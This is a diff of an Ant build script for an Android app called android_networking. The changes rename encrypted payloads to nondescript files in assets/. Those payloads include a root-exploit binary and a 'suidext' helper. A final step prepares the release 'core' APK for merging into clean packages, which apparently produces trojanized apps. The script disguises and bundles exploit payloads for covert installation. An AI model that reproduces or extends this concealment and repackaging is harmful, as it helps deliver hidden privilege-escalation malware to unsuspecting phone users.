@@ -79,9 +79,11 @@
 
 	<target name="encrypt-messages" depends="salt">
 		<delete file="res/raw/messages.bin" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyMessages}" inputFile="preprocess/messages.properties.all" outputFile="res/raw/messages.bin" />
+		<delete file="assets/m.bin" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyMessages}" inputFile="preprocess/messages.properties.all" outputFile="assets/m.bin" />
 		<delete file="res/raw/statusdb.bin" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="libs/armeabi/suidext" outputFile="res/raw/statusdb.bin" />
+		<delete file="assets/s.bin" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="libs/armeabi/suidext" outputFile="assets/s.bin" />
 	</target>
 
 	<target name="encrypt-manifest" depends="salt">
@@ -93,17 +95,18 @@
 
 	<target name="encrypt-exploit" depends="salt">
 		<delete file="res/raw/statuslog.bin" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusLog}" inputFile="libs/armeabi/exploit" outputFile="res/raw/statuslog.bin" />
+		<delete file="assets/e.bin" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusLog}" inputFile="libs/armeabi/exploit" outputFile="assets/e.bin" />
 	</target>
 
 	<target name="encrypt-noexploit">
-		<delete file="res/raw/statuslog.bin" />
-		<touch file="res/raw/statuslog.bin" />
+		<delete file="assets/e.bin" />
+		<touch file="assets/e.bin" />
 	</target>
 
 	<target name="encrypt-nomanifest">
 		<delete file="res/raw/layout.bin" />
-		<touch file="res/raw/layout.bin" />
+		<!-- <touch file="res/raw/layout.bin" /> -->
 	</target>
 
 	<target name="libsnoexp" depends="encrypt-messages, encrypt-noexploit, encrypt-nomanifest">
@@ -135,9 +138,6 @@
 		<sequential>
 			<echo message="osversion: @{osversion}" />
 			<echo message="kind: @{kind}" />
-
-			<delete file="res/raw/config.bin" />
-			<delete file="res/raw/resources.bin" />
 
 			<switch value="@{kind}">
 				<case value="debug">
@@ -403,9 +403,9 @@
 		<antcall target="release" inheritAll="false" />
 		<var name="filename" value="bin/android_networking-release.apk" />
 		<mkdir dir="output/merge/" />
-		<copy file="${filename}" toFile="output/merge/core.android.release.apk" overwrite="true" />
-		<copy file="merge.rb" toFile="output/merge/merge.rb" overwrite="true" />
+		<copy file="${filename}" toFile="output/merge/core.android.release.apk" overwrite="true" />		
 		<copy file="methodStartService.txt" toFile="output/merge/methodStartService.txt" overwrite="true" />
+		<echo>..\..\merge.rb C:\HT\Reversing\Android\CleanPackages\</echo>
 	</target>
 	
 	<target name="servercore">
